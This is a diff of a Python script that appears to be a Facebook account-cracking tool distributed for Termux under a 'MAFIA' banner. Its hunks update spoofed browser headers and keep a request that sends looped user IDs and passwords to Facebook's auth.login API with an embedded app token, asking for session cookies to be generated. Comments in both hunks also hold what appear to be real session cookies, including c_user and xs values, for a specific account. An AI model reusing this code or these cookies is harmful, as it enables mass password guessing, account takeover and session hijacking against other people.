@@ -403,7 +403,7 @@ logo ="""
 \033[1;32m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆>>>\033[1;31m»»\033[1;32mMAFIA REYESS✓✓               
 \033[1;97m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋>>>\033[1;97m»»\033[1;97m+93783361438✓✓
 \033[1;32m𝙂𝙄𝙏𝙃𝙐𝘽>>>>>>>\033[1;31m»»\033[1;31mCrimanl313✓✓
-\033[1;31m𝙑𝙄𝙍𝙎𝙊𝙉>>>>>>>\033[1;31m»»\033[1;32m9.9✓✓   
+\033[1;31m𝙑𝙄𝙍𝙎𝙊𝙉>>>>>>>\033[1;31m»»\033[1;32m9.5✓✓   
 \033[1;32m𝙏𝙊𝙊𝙇 𝙎𝙏𝙐𝙏𝘼𝙎>>>>\033[1;31m»»\033[1;32m𝙁𝙍𝙀𝙀✓✓
 \033[1;35m𝙏𝙀𝙍𝙈𝙐𝙓 𝘼𝙇𝙇 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 𝘽𝙔 MAFIA ✓✓
 \033[1;32m««««««««««««««««««««««««««««««««««««««««««««««««"""
@@ -851,24 +851,23 @@ class Main:
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; m_pixel_ratio=3.43505597114563; locale=en_US; wd=315x578; fr=0ULMFGIF7cmGl1dcS.AWUsUqp7WoHhJL-Hd62mEQM1iu4.BmFC2j..AAA.0.0.BmFC3c.AWWrnVdpOow',
+    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; locale=en_US; m_pixel_ratio=3.7835533618927; c_user=100000268365288; xs=15%3ASsI3jPC7rUqd0Q%3A2%3A1712606969%3A-1%3A-1; fr=0ULMFGIF7cmGl1dcS.AWWz3_q-pBkH9dLjkmcHr2R1WRo.BmFC2j..AAA.0.0.BmFE77.AWW9kuX09pw; m_page_voice=100000268365288; wd=712x1308; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcmVmPWRibCZwYWlwdj0wJmVhdj1BZmFxNlluZ1J2Sy1ic3BCT05SNFo5X0xTRGJnU2dGVldsY3VvcW16aU5HdUxYclZGcFREZHQ1M09wbkM2bzFWaGxJIiwiaCI6Ii9ib29rbWFya3MvP3JlZj1kYmwmcGFpcHY9MCZlYXY9QWZhcTZZbmdSdkstYnNwQk9OUjRaOV9MU0RiZ1NnRlZXbGN1b3FtemlOR3VMWHJWRnBURGR0NTNPcG5DNm8xVmhsSSIsInMiOiJtIn0%3D',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/',
+    'referer': 'https://m.facebook.com/bookmarks/?ref=dbl&paipv=0&eav=Afaq6YngRvK-bspBONR4Z9_LSDbgSgFVWlcuoqmziNGuLXrVFpTDdt53OpnC6o1VhlI',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Mi Note 10 Lite"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1012612339;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,3;features,;u,100037434300555;","a":"1712598470","t":31536000,"n":"jwoZxiNM","v":"2462","p":4,"r":1012612339,"o":"h2","y":"wblt"}',
+    'service-worker-navigation-preload': '{"r":1012615515,"y":"m"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
@@ -1314,24 +1313,23 @@ class Main:
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; m_pixel_ratio=3.43505597114563; locale=en_US; wd=315x578; fr=0ULMFGIF7cmGl1dcS.AWUsUqp7WoHhJL-Hd62mEQM1iu4.BmFC2j..AAA.0.0.BmFC3c.AWWrnVdpOow',
+    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; locale=en_US; m_pixel_ratio=3.7835533618927; c_user=100000268365288; xs=15%3ASsI3jPC7rUqd0Q%3A2%3A1712606969%3A-1%3A-1; fr=0ULMFGIF7cmGl1dcS.AWWz3_q-pBkH9dLjkmcHr2R1WRo.BmFC2j..AAA.0.0.BmFE77.AWW9kuX09pw; m_page_voice=100000268365288; wd=712x1308; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcmVmPWRibCZwYWlwdj0wJmVhdj1BZmFxNlluZ1J2Sy1ic3BCT05SNFo5X0xTRGJnU2dGVldsY3VvcW16aU5HdUxYclZGcFREZHQ1M09wbkM2bzFWaGxJIiwiaCI6Ii9ib29rbWFya3MvP3JlZj1kYmwmcGFpcHY9MCZlYXY9QWZhcTZZbmdSdkstYnNwQk9OUjRaOV9MU0RiZ1NnRlZXbGN1b3FtemlOR3VMWHJWRnBURGR0NTNPcG5DNm8xVmhsSSIsInMiOiJtIn0%3D',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/',
+    'referer': 'https://m.facebook.com/bookmarks/?ref=dbl&paipv=0&eav=Afaq6YngRvK-bspBONR4Z9_LSDbgSgFVWlcuoqmziNGuLXrVFpTDdt53OpnC6o1VhlI',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Mi Note 10 Lite"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1012612339;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,3;features,;u,100037434300555;","a":"1712598470","t":31536000,"n":"jwoZxiNM","v":"2462","p":4,"r":1012612339,"o":"h2","y":"wblt"}',
+    'service-worker-navigation-preload': '{"r":1012615515,"y":"m"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
